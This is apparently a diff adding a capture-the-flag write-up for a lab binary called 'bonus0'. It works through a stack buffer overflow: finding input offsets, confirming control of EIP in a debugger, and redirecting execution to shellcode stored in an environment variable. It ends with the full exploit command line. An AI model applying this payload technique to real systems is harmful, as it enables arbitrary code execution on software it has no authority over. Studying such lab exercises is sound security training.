@@ -1,0 +1,30 @@
+//19 in both strings ch no segfault and seems coherent with the cutter code :
+AAAAAAAAAAAAAAAAAAA
+
+//We have a segfault so we might be able to overflow eip and jump wherever we want.
+
+//20car for the first
+//overflow after 9 car for the second one
+
+//We created an environment variable wich contains our shellcode and it's' address in bash is
+0xbffff77d
+\x7d\xf7\xff\xbf
+
+Starting program: /home/user/bonus0/bonus0 
+ - 
+AAAAAAAAAAAAAAAAAAAA
+ - 
+123456789ABCDEFGHIJK
+AAAAAAAAAAAAAAAAAAAA123456789ABCDEFGHIJK��� 123456789ABCDEFGHIJK���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44434241 in ?? ()
+
+//Here we can see that eip is replaced by 0x44434241 aka ABCD
+//So we have to change this section of our string by the address of our new EGG env variable
+
+AAAAAAAAAAAAAAAAAAAA
+ - 
+123456789\x7d\xf7\xff\xbfEFGHIJK
+
+(echo "AAAAAAAAAAAAAAAAAAAA" ; python -c "print '123456789\x7d\xf7\xff\xbfEFGHIJK'"; cat ) | ./bonus0 
